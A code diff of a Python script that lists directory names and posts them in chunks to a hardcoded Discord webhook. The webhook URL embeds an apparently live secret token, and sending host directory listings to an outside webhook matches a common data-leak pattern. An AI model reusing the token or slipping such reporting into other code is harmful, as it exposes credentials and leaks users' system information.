@@ -3,19 +3,16 @@ import json
 import http.client
 
 # === CONFIG ===
-directory_path = "/"  # Current directory
+directory_path = "."  # Current directory
 webhook_url = "https://discord.com/api/webhooks/1412652259464183870/Q6sUf0lJhO2Z4E-fvDdvpU2oO3lRvXYRmRgs7Q-fsdXJNm3UD-3Y9U6lydSjMLmVMn9m"
+MAX_CHUNK_SIZE = 1500  # max message length per chunk
 
-# === Manually parse webhook URL ===
-# Example URL: https://discord.com/api/webhooks/{id}/{token}
+# === Manual URL parsing ===
 def parse_webhook_url(url):
-    # Remove scheme (https://)
     if url.startswith("https://"):
         url = url[len("https://"):]
     elif url.startswith("http://"):
         url = url[len("http://"):]
-
-    # Split at first slash to get hostname and path
     parts = url.split("/", 1)
     hostname = parts[0]
     path = "/" + parts[1] if len(parts) > 1 else "/"
@@ -27,22 +24,32 @@ hostname, path = parse_webhook_url(webhook_url)
 directories = [d for d in os.listdir(directory_path) if os.path.isdir(os.path.join(directory_path, d))]
 directory_list_text = "\n".join(directories) or "No directories found."
 
-# === Prepare webhook payload ===
-payload = {
-    "content": f"📂 List of directories in `{directory_path}`:\n```{directory_list_text}```"
-}
-json_payload = json.dumps(payload)
+# === Split text into chunks without breaking lines ===
+def split_into_chunks(text, max_length):
+    chunks = []
+    lines = text.split("\n")
+    current_chunk = ""
+    
+    for line in lines:
+        if len(current_chunk) + len(line) + 1 > max_length:
+            chunks.append(current_chunk.rstrip("\n"))
+            current_chunk = ""
+        current_chunk += line + "\n"
+    if current_chunk:
+        chunks.append(current_chunk.rstrip("\n"))
+    return chunks
 
-# === Send HTTP POST ===
+chunks = split_into_chunks(directory_list_text, MAX_CHUNK_SIZE)
+
+# === Send each chunk as a separate webhook message ===
 conn = http.client.HTTPSConnection(hostname)
 headers = {"Content-Type": "application/json"}
-conn.request("POST", path, body=json_payload, headers=headers)
-response = conn.getresponse()
 
-# === Output result ===
-if response.status == 204:
-    print("✅ Message sent to Discord.")
-else:
-    print(f"❌ Failed to send message. Status: {response.status} {response.reason}")
+for i, chunk in enumerate(chunks):
+    content = f"📂 List of directories in `{directory_path}` (part {i+1}/{len(chunks)}):\n```{chunk}```"
+    payload = json.dumps({"content": content})
+    conn.request("POST", path, body=payload, headers=headers)
+    response = conn.getresponse()
+    response.read()  # Consume response to free connection
 
 conn.close()
